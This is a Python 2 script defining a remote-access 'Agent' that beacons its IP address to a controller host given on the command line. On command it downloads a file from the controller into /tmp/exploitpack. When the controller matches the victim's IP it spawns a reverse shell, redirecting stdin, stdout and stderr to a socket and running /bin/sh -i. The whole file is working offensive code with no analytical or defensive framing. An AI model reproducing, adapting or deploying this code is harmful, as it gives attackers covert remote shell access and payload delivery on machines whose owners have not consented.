import socket,subprocess,errno,time,os,signal,sys

class Agent:
    def __init__(self, target, port):
        self.hostname = target
        self.port = int(port)

    def run_worker(self):
        while True:
            try:
                print "[*] Poking server"
                self.poke()
            except Exception,exc:
                  time.sleep(2)
            else:
                print "[*] Hello Server"
        else:
            raise

    def poke(self):
        whoami = ([(checkip.connect(('8.8.8.8', 80)), checkip.getsockname()[0], checkip.close()) for checkip in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1])
        time.sleep(1)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.hostname, self.port))
        s.sendall(whoami)
        data = s.recv(1024)
        split = data.split(":")
        if len(split) > 2:
            command = split[2]
            print repr(command)
            if 'file' == command.rstrip():
                while 1:
                    print "[*] Receiving file"
                    sfile = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sfile.connect((self.hostname, int(split[1])))
                    print "connecting to: "
                    print self.hostname
                    print int(split[1])
                    sfile.send("\n")
                    data = sfile.recv(8192)
                    print data
                    fw = open("/tmp/exploitpack", "wb")
                    fw.write(data)
                    fw.close()
        if whoami == split[0]:
            print "[*] Creating reverse shell"
            sterminal = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sterminal.connect((self.hostname, int(split[1])))
            os.dup2(sterminal.fileno(), 0)
            os.dup2(sterminal.fileno(), 1)
            os.dup2(sterminal.fileno(), 2)
            subprocess.call(["/bin/sh", "-i"])
        s.close()

    def recvall(self):
        data = ""
        part = None
        while part != "":
            part = self.recv(4096)
            data += part
        return data

hostname = sys.argv[1]
port = sys.argv[2]
new = Agent(hostname, port)
new.run_worker()

